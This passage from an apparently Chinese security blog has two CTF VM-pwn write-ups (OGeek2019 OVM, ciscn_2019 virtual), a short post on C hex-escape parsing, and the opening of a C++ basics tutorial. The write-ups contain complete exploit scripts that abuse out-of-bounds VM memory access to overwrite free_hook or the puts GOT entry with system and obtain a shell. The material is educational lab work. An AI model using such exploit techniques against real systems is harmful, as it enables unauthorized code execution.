<h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><h3 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041849897.png" alt="image-20221204184926728"></p>
<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041852544.png" alt="image-20221204185221474"></p>
<p>首先程序申请了一块堆空间，程序结束的时候可以往里面输入东西，然后将其释放掉。随后询问了PC和SP寄存器的值(所谓的寄存器就是在bss段上开辟的一片数组)，而pc和sp在这道题里没有任何用，接着要我们要输入指令的个数。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041923932.png" alt="image-20221204192348862"></p>
<p>上面代码的注释写的很清楚了，下面的代码在while循环里的部分是处理指令的部分，而最后read函数去往堆块里输入数据，再将这个堆块free掉</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041924716.png" alt="image-20221204192408661"></p>
<p>在execute函数里将我们输入的每个指令都进行了分析，大概就是用c语言来实现了汇编的指令，首先每个指令都是四字节，最高字节是一个操作码(这个操作码用if来判断，这个指令是干啥的)，然后另外三个字节是操作数，以add指令为例，首先用HIBYTE这个宏判断最高字节是否为0x70，如果是0x70就执行</p>
<p><code>reg[high]=reg[low]+reg[medium]</code>很明显这是个add指令。通过reg数组以及配合其索引来进行的操作，索引就是指令的各个字节。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041944999.png" alt="image-20221204194431944"></p>
<p>下面这个指令是将具体的数值赋值给reg数组里的某个元素，只有赋值完毕，上面的add指令才有用</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042032767.png" alt="image-20221204203212704"></p>
<p>而本题的漏洞则在下面两个指令</p>
<p>reg[low]的值可以控制，这意味着memory的索引可以溢出，从而去篡改某些指针。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042033519.png" alt="image-20221204203332481"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042033212.png" alt="image-20221204203341172"></p>
<p>因为无法篡改got表，所以把利用点放到程序最后往comment的输入上(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042035714.png" alt="image-20221204203553678"></p>
<p>如果我们能篡改comment这个指针的话，就意味着程序的最后可以任意地址写，并且还调用了free函数，那就利用数组溢出将comment改成free_hook-8的地址，最后输入字符串&#x2F;bin&#x2F;sh以及system的地址过去，执行free函数的时候则获取shell。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先我们要把free_hook-8的地址写到一个地址上，然后将这个地址利用数组溢出写到comment上。而第一步我们需要做出来一个free_hook-8的地址，考虑到bss段上方是got表，我们利用负数索引就可以实现地址任意读取，这里我读取的是stderr的地址，将其读到了reg[4][5]的位置(因为地址是八字节，而一个数组元素是四字节，所以需要两个数组元素放一个地址)</p>
<p>而后用add指令将stderr的地址改成free_hook-8，最后将free_hook-8赋值到comment的位置即可。具体情况参考exp</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26005&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;PC: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x1111</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;SP: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x1111</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;CODE SIZE: &quot;</span>,<span class="built_in">str</span>(<span class="number">18</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">op,high,medium,low</span>):</span><br><span class="line">    payload=(op&lt;&lt;<span class="number">24</span>)+(high&lt;&lt;<span class="number">16</span>)+(medium&lt;&lt;<span class="number">8</span>)+(low)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;CODE: &quot;</span>)</span><br><span class="line"><span class="comment">#create a stderr address in reg array</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">26</span>)     <span class="comment">#mov reg[0],26</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[1]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x30</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov reg[4],memory[reg[2]]</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">25</span>)     <span class="comment">#mov reg[0],25</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[1]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x30</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov reg[5],memory[reg[2]]       reg[4][5]---&gt;stderr address</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#create free_hook address through stderr address</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0x10</span>)     <span class="comment">#mov reg[2],0x10</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>)      <span class="comment">#mov reg[0],8</span></span><br><span class="line">opcode(<span class="number">0xc0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>)      <span class="comment">#reg[1]=sal reg[2],8</span></span><br><span class="line"></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0xa0</span>)   <span class="comment">#mov reg[2],0xa0</span></span><br><span class="line">opcode(<span class="number">0x70</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>)      <span class="comment">#add reg[1],reg[2]</span></span><br><span class="line">opcode(<span class="number">0x70</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">1</span>)      <span class="comment">#add reg[4],reg[1]              reg[4][5]---&gt;free_hook address-8</span></span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xD39</span>)</span><br><span class="line"><span class="comment">#let pointer comment point to free_hook</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x8</span>)     <span class="comment">#mov reg[0],8</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[7]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x40</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov memory[reg[2]],reg[4]</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x7</span>)     <span class="comment">#mov reg[0],9</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[7]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x40</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov memory[reg[2]],reg[5]</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;R4: &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;R5: &quot;</span>)</span><br><span class="line">addr2=<span class="built_in">int</span>(p.recv(<span class="number">4</span>),<span class="number">16</span>)</span><br><span class="line">sys_addr=addr1+((addr2)&lt;&lt;<span class="number">32</span>)-<span class="number">0x381410</span></span><br><span class="line">log_addr(<span class="string">&#x27;sys_addr&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042056131.png" alt="image-20221204205650878"></p>
<h2 id="ciscn-2019-qual-virtual"><a href="#ciscn-2019-qual-virtual" class="headerlink" title="ciscn_2019_qual_virtual"></a>ciscn_2019_qual_virtual</h2><h3 id="保护策略-1"><a href="#保护策略-1" class="headerlink" title="保护策略"></a>保护策略</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052243919.png" alt="image-20221205224348518"></p>
<h3 id="程序逻辑-1"><a href="#程序逻辑-1" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><h4 id="控制堆块与text-data-stack"><a href="#控制堆块与text-data-stack" class="headerlink" title="控制堆块与text data stack"></a>控制堆块与text data stack</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052246509.png" alt="image-20221205224630447"></p>
<p>程序最开始分配了data段，text段和stack段。他们实现的方式都是用一个控制堆块来存放申请出来的这个段的指针，而返回的是控制堆块的地址(以stack段举例，如下)</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052248915.png" alt="image-20221205224802845" style="zoom:50%;" />

<p>malloc先是申请了0x10的内存出来，当做控制堆块，而后申请了8*0x40的内存当做stack，将其地址赋给s，而s这个指针存放到了ptr这个控制堆块里，最后返回ptr。</p>
<h4 id="获取操作码的函数"><a href="#获取操作码的函数" class="headerlink" title="获取操作码的函数"></a>获取操作码的函数</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052250722.png" alt="image-20221205225055604"></p>
<p>这里的实现思路是检测我们输入的字符串中是否出现了指令字符，比如push pop add等等，然后将对应指令换成操作码来存储到text段上(赋值如下)，40144E函数将ptr[i]存放的机器码给到了a1(text段)</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052252420.png" alt="image-20221205225251375" style="zoom:67%;" />

<p>上面需要注意的是strtok函数，strtok函数会遍历delim中的每一个字符，如果delim中有任何一个字符在第一个参数中出现，那么就会把这个字符当做分隔符进行分割，使用过strtok函数一次后，之后的每次往下分割只需要让第一个参数为NULL即可。</p>
<h4 id="获取数据的函数"><a href="#获取数据的函数" class="headerlink" title="获取数据的函数"></a>获取数据的函数</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052256437.png" alt="image-20221205225650366"></p>
<p>这个函数是获取用户输入的每个数据，将其存储到data段上，也是以delim分割(这个data段是和text段以及stack段配套使用的)</p>
<h4 id="处理指令函数"><a href="#处理指令函数" class="headerlink" title="处理指令函数"></a>处理指令函数</h4><p>这个execute函数可以对之前输入的每个指令进行处理，需要注意的是下面的puts(s)，因为s可控，并且程序可以被篡改got表，所以之后有机会可以考虑将puts的got表劫持为system的地址，从而在此处获取shell</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052258349.png" alt="image-20221205225833308"></p>
<p>然后下面分析几个典型的函数</p>
<p>下面这个函数是从a1里面获取一个值，存放到a2指向的位置。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052300547.png" alt="image-20221205230047501"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052303350.png" alt="image-20221205230302286"></p>
<p>结合上图来说，(get函数)就是从第一个参数中取一个数据放置到v6中，从而识别出不同指令。</p>
<h5 id="push函数"><a href="#push函数" class="headerlink" title="push函数"></a>push函数</h5><p>接着是push函数，从函数引用这里看出push函数需要一个stack的地址和data地址(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052306158.png" alt="image-20221205230636113"></p>
<p>进入内部的话是依次调用了这两个函数，前者是上面分析过的get函数，将data段里的一个数据取出来给v3，而第二个函数是将v3的值赋值给stack，具体内部实现的过程就不放了，因为我分析的不是十分透彻，<strong>我主要是通过动态调试观察函数执行前和执行后stack data text以及寄存器里的变化得出来每个函数的作用</strong></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052307117.png" alt="image-20221205230703076"></p>
<h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h5><p>然后是add函数，内部是用了两个get连续从stack里面取两次数据，相加后覆盖了第一个操作数将其放回。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052309678.png" alt="image-20221205230944629"></p>
<h5 id="save函数"><a href="#save函数" class="headerlink" title="save函数"></a>save函数</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052311263.png" alt="image-20221205231132218"></p>
<p>发现就一个参数stack(注意这个stack是控制堆块的地址，而控制堆块里存放的地址才是真正指向stack的)</p>
<p>内部实现如下，先是从stack里取了两个数据，红框里才是最重要的部分，简单分析一下，*(stack+12)是stack中存储元素的个数，再加v2(可控)的值乘以8加上*stack(*stack就是真正stack的地址，而本来的stack是控制堆块的地址)得到最后的地址，save函数就是将v3的值写入最后这个地址里。</p>
<p>很明显v2是可控的，因此可以利用*stack加上一个可控偏移来实现任意数据写入</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052313057.png" alt="image-20221205231309007"></p>
<h5 id="load函数"><a href="#load函数" class="headerlink" title="load函数"></a>load函数</h5><p>load函数与save函数相反，它的漏洞最后可以利用为从任意地址读出数据放入栈中(如下)，同样是因为v2可控，这样可以利用*stack加上可控偏移将任意地址(前提是任意地址和*stack存在固定偏移)中的数据读入到栈中</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052320237.png" alt="image-20221205232048187"></p>
<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>综上所述，我们考虑劫持puts的got表为system地址。先将puts的地址用load读入到stack中再用add函数加上一定的偏移得到system的地址，再利用save函数将system的地址写入到puts的got表。</p>
<p>调试过程如下：</p>
<p>下图为正常情况下stack与其控制堆块的关系，可以很明显的看到控制堆块里存放的是stack的指针，如果我们想去篡改got表，第一件事就是要将这个地址修改成got地址附件的地址。</p>
<blockquote>
<p>能否直接将控制堆块中存放的地址修改为puts的got地址?</p>
<p>不能，如果修改后的话，*(stack+12)就会拿到一个超级大的值被当做索引(而这个超级大的值实际上是函数的真实地址)，需要注意的是控制堆块中的地址决定了stack位于何处，如果更改为puts的got地址后，之后的push操作则会对各个函数的got表进行破坏，并且*(stack+12)也会因为过大导致程序崩溃</p>
</blockquote>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052324075.png" alt="image-20221205232444875"></p>
<p>所以我们得先把stack迁移到got表附近，这里我迁移到了0x4040d0，这里正好位于了got表的下方(如下图)，并且这个地方正好都是内存为0，当做一个新的stack再好不过。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052330226.png" alt="image-20221205233023770" style="zoom:50%;" />

<p>此时新的stack位于got表下方，我们push进来新的索引，让其为负数，这样就能通过新的stack访问到got表中的数据，将其写到新的stack</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052332630.png" alt="image-20221205233223457"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052333469.png" alt="image-20221205233335216"></p>
<p>最后执行一次save函数将system的地址写回puts的got表即可</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25001&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your program name:\n&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x4019E2</span>,<span class="number">0x401A75</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your instruction:\n&quot;</span>,<span class="string">&quot;push push save push load push add push save&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your stack data:\n&quot;</span>,<span class="string">&quot;4210896 -3 -21 -172800 -21&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052338726.png" alt="image-20221205233853481"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.anquanke.com/post/id/208450#h2-0">VM Pwn学习-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a href="https://blog.csdn.net/A951860555/article/details/117214601">(44条消息) OGeek_2019_Final OVM题解___lifanxin的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>vm pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>c语言中warning:hex escape sequence out of range的探究</title>
    <url>/posts/d1f2e628.html</url>
    <content><![CDATA[<h2 id="起因："><a href="#起因：" class="headerlink" title="起因："></a>起因：</h2><p>在和 <strong>clown</strong> 说 <code>memcpy</code> 函数拷贝字符串是不会被 <code>\x00</code> 截断这个结论之前，为了避免翻车（尽管我有九成九的把握），我自己写了个代码进行验证，结果发现了一些奇怪的事情…</p>
<span id="more"></span>

<h2 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *str=<span class="string">&quot;abcd\x00efgklm&quot;</span>;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">	<span class="built_in">memcpy</span>(buf,str,<span class="number">12</span>);</span><br><span class="line">	write(<span class="number">1</span>,buf,<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先将一个字符串常量中夹杂一个空字符 <code>\x00</code> ，然后用 <code>memcpy</code> 函数进行拷贝到新的数组中，最终用 <code>write</code> 函数进行输出，这样就能清楚的判断 <code>\x00</code> 会不会造成截断效果</p>
<p>运行起来的效果如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310052156440.png" alt="image-20231005215620318"></p>
<p>看到 <code>\x00</code> 后面的字符串 <code>gklm</code> 成功输出后，我就去告诉了 <strong>clown</strong> <code>\x00</code> 并不会截断 <code>memcpy</code> 函数的结论，正准备收工时，我突然发现字符 <code>ef</code> 没了😮</p>
<p>本着不放弃小细节的原则，我并不打算得过且过。</p>
<p>先使用了 <code>gdb</code> 进行调试</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310052206532.png" alt="image-20231005220602193"></p>
<p>查看 <code>memcpy</code> 函数的第二个参数要拷贝的字符串为 <code>abcd\357gklm</code> ，这个 <code>\357</code> 我第一时间没反应过来，以为这里是出问题了？😨   不过联想到这里的数据原本是字符 <code>e</code> 和 <code>f</code> ，我猜测可能是被解析成十六进制数据了，用计算器查看了一下发现 <code>357</code> 是八进制，表示为十六进制是 <code>\xef</code> </p>
<p>上网查资料，得知编译器看到 <code>\x</code> 时，它会尝试解析后面的所有十六进制数字，直到遇到一个非十六进制数字。在上面的代码中，它看到了 <code>\x00ef</code> 将其解析为一个单一的字符 <code>\xef</code> ，而并非是我希望的空字符 <code>\x00</code> 和字符 <code>e</code> <code>f</code></p>
<p>我又好奇如果给的数据为 <code>\x01ef</code> ，那么在内存中这个值会如何表示？因为之前的高位 <code>00</code> 是可以省略的，但这个高位的 <code>\x01</code> 无法省略 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *str=<span class="string">&quot;abcd\x01efgklm&quot;</span>;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">	<span class="built_in">memcpy</span>(buf,str,<span class="number">12</span>);</span><br><span class="line">	write(<span class="number">1</span>,buf,<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310052215253.png" alt="image-20231005221525192"></p>
<p>发现在编译时就已经给了 <code>warning: hex escape sequence out of range</code> ，这表示十六进制转义序列超出范围，在 <code>\x</code> 之后的第三个字符如果依然可以表示十六进制（<code>0~9</code> <code>a~f</code>），会一起转义，这里的 <code>\x01ef</code> 超过了 <code>ASCII</code> 码的范围</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310052224568.png" alt="image-20231005222408394"></p>
<p>在使用 <code>gdb</code> 调试时，只能看到 <code>\xef</code> ，高位的 <code>\x01</code> 已经不见了。这因为十六进制转义序列的长度虽然没有限制，但在实际使用中，一个字符只能包含8个比特（即1个字节），所以这里是直接舍弃了高位的数据，即使写成 <code>\x11223344</code> 最后留下的也只有 <code>\x44</code></p>
<h2 id="如何达到我想要结果？"><a href="#如何达到我想要结果？" class="headerlink" title="如何达到我想要结果？"></a>如何达到我想要结果？</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310052234407.png" alt="image-20231005223445247"></p>
<p>在下面的参考文章中对这个进行了说明，只需要将字符串拆开就可以正常来显示了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *str=<span class="string">&quot;abcd\x00&quot;</span> <span class="string">&quot;efgklm&quot;</span>;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">	<span class="built_in">memcpy</span>(buf,str,<span class="number">12</span>);</span><br><span class="line">	write(<span class="number">1</span>,buf,<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310052236058.png" alt="image-20231005223606998"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310052237063.png" alt="image-20231005223659788"></p>
<p>如此不但验证了上面 <code>memcpy</code> 函数不会被 <code>\x00</code> 截断拷贝的结论，并且还发现了两个有意思的现象</p>
<ol>
<li><code>\x0061</code> 实际上为 <code>\x61</code> 因为编译器会尝试解析后面的所有十六进制数字，直到遇到一个非十六进制数字，此处的 <code>\x00</code> 为高位可以被省略，属于正常代码</li>
<li><code>\x0161</code> 实际上还是 <code>\x61</code>，因为 <code>\x0161</code> 尝试被解析为一个十六进制的数据，导致超出最大的转义序列范围，只保留了最低位并且编译器给了 <code>warning</code></li>
</ol>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://learn.microsoft.com/zh-cn/cpp/c-language/octal-and-hexadecimal-character-specifications?view=msvc-170">https://learn.microsoft.com/zh-cn/cpp/c-language/octal-and-hexadecimal-character-specifications?view=msvc-170</a></p>
]]></content>
      <categories>
        <category>探究</category>
      </categories>
  </entry>
  <entry>
    <title>C++ 常见术语&amp;&amp;基础概念的学习总结</title>
    <url>/posts/4320fd7a.html</url>
    <content><![CDATA[<p>简单入门了一下 C++ ，学习了几天，大概清楚了这些常用的术语和基础概念，虽然这对 <code>PWN</code> 中的 C++ 题目逆向帮助实在不大，但好奇心总是驱使着我尝试弄懂它们。感谢 <code>winmt</code> 师傅在我这部分的学习中，解惑我的一些奇奇怪怪的问题</p>
<span id="more"></span>

<h3 id="从输出hello-world开始"><a href="#从输出hello-world开始" class="headerlink" title="从输出hello world开始"></a>从输出hello world开始</h3><p>在 C++ 中可以用如下代码来输出<code>hello world</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>iostream</code> 这个头文件定义了输入输出流的相关类型和函数，这里为什么不是<code>#include&lt;iostream.h&gt;</code> 呢，因为在 C++ 11 标准后，<strong>标准库的头文件</strong>就不再使用 <code>.h</code> 作为后缀了，这样的好处是能够更好的区分标准库的头文件和用户自定义的头文件，比如我们自己写了一个名为 <code>iostream.h</code> 的头文件，就可以使用 <code>#include&lt;iostream.h&gt;</code> 来包含这个头文件，而不会和标准库的 <code>&lt;iostream&gt;</code> 头文件冲突。</p>
<p>此处输出 <code>hello world\n</code> 是 <code> std::cout &lt;&lt; &quot;hello world&quot;</code>这部分来实现的，而后面 <code>\n</code> 则是 <code>&lt;&lt; std ::endl</code>来实现的。 <code>std</code>是标准命名空间，用于区分不同符号名称的机制，在 C++ 标准库中，所有类型和函数都被定义到了标准命名空间（也就是 <code>std</code> ） 补充： 如果在 main函数之前写入 <code>using namespace std</code> 那么之后出现属于 <code>std</code> 中的对象就不必在前面加入 <code>std::</code>了，但通常我们不这么做，尽管这样看起来可能很简洁。</p>
<p>举个例子，全国有很多个张三，为了区分这些张三我们可以给每个张三都加一个前缀，比如河南的张三，北京的张三，这个前缀也就是不同的命名空间了。</p>
<p><u>我们可以使用这个 <code>std::cout</code> <strong>输出流对象</strong>来输出内容</u>，这个输出流对象就是定义在 <code>std</code> 中的。而 <code>&lt;&lt;</code> 是一个流插入运算符，将数据输出到流中。 <code>std::cout &lt;&lt; &quot;hello world&quot; </code> 可以理解为将字符串 <code>”hello world&quot;</code> 流向<code>std::cout</code> 这个输出流，从而进行了输出。 <code>&lt;&lt;</code> 明明是左移运算符，但这里为什么是流插入运算符呢？这是因为运算符重载，姑且可以理解这个重载就是分身，即同一个符号可以在不同情况下有不同的意思</p>
<p>从简单来说，可以把 <code>std::endl</code>看成一个 <code>\n</code> 添加到字符串的末尾，但实际上它的本质是一个函数指针，具体功能是在字符串中增加了一个 <code>\n</code> 并且还调用了flush来刷新缓冲区。那既然是函数指针，怎么调用的时候没有加 <code>()</code> 呢？这是因为这个函数指针被重载运算符 <code>&lt;&lt;</code> 所包装，成为了函数对象，在调用函数对象时不需要再加上圆括号了，因为调用运算符已经被重载了。</p>
<p>下面先来介绍 C++ 中的函数重载，这需要先从一个问题开始思考</p>
<h3 id="std-cout如何识别参数类型"><a href="#std-cout如何识别参数类型" class="headerlink" title="std::cout如何识别参数类型"></a>std::cout如何识别参数类型</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301042011540.png" alt="image-20230104201132267" style="zoom:50%;" />

<p>我这里输出了三种类型的数据，分别是 <code>char *</code> <code>int</code> <code>double</code>类型，并且都成功的进行了输出，如果是C语言的话，这里肯定是用 <code>printf</code> 函数中的不同格式化字符来匹配对应的数据，奇怪的是在 C++ 中，看起来一样的输出语句怎么可以匹配不同的参数类型呢？</p>
<p>这就要提到函数重载这个知识点了。</p>
